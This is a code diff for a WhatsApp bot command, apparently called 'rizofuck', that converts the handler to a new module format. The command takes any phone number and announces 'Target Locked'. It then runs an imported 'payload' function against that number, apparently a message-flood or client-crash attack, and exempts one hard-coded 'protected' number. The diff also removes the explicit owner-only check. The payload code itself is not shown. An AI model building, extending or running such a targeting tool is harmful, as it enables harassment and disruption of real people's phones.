@@ -1,37 +1,31 @@
-let { rizofuck } = require('../lib/rizofuck');
+const { rizofuck } = require('../lib/rizofuck');
 
-let handler = async (m, { conn, args, command, isCreator }) => {
-    if (!isCreator) return m.reply('🔒 *Owner Only - Rizofuck Command!*');
-
+module.exports = {
+  name: "rizofuck",
+  commands: ['rizofuck', 'rzfuck', 'fuck'],
+  category: "owner",
+  description: "Execute high-speed interaction loop",
+  async execute(sock, m, args) {
     if (!args[0]) {
-        return m.reply(`📌 *Usage:* .${command} 923xx`);
+      return sock.sendMessage(m.chat, { text: `📌 *Usage:* .rizofuck 923xx` }, { quoted: m });
     }
 
     let pepec = (args[0] || "").replace(/[^0-9]/g, "");
-
-    if (!pepec) {
-        return m.reply('❌ *Invalid number format!*');
-    }
+    if (!pepec) return sock.sendMessage(m.chat, { text: '❌ *Invalid number format!*' }, { quoted: m });
 
     let protectedNumbers = ["923154734548"];
     if (protectedNumbers.includes(pepec)) {
-        return m.reply('🔒 *This number is protected!*');
+      return sock.sendMessage(m.chat, { text: '🔒 *This number is protected!*' }, { quoted: m });
     }
 
     let target = pepec + '@s.whatsapp.net';
-
-    await m.reply(`💀 *Rizofuck Target Locked:* ${pepec}\n⚡ *Executing sequence...*`);
+    await sock.sendMessage(m.chat, { text: `💀 *Rizofuck Target Locked:* ${pepec}\n⚡ *Executing sequence...*` }, { quoted: m });
 
     try {
-        await rizofuck(conn, target);
-        await conn.sendMessage(m.chat, { react: { text: "💀", key: m.key } });
+      await rizofuck(sock, target);
+      await sock.sendMessage(m.chat, { react: { text: "💀", key: m.key } });
     } catch (error) {
-        console.error(error);
-        m.reply("⚠️ Error: Payload execute karte waqt masla aaya hai.");
+      await sock.sendMessage(m.chat, { text: "⚠️ Error: Payload execute karte waqt masla aaya hai." }, { quoted: m });
     }
-}
-
-handler.command = ['rizofuck', 'rzfuck', 'fuck'];
-handler.tags = ['owner', 'rizo'];
-handler.help = ['rizofuck 923xx'];
-module.exports = handler;
+  }
+};
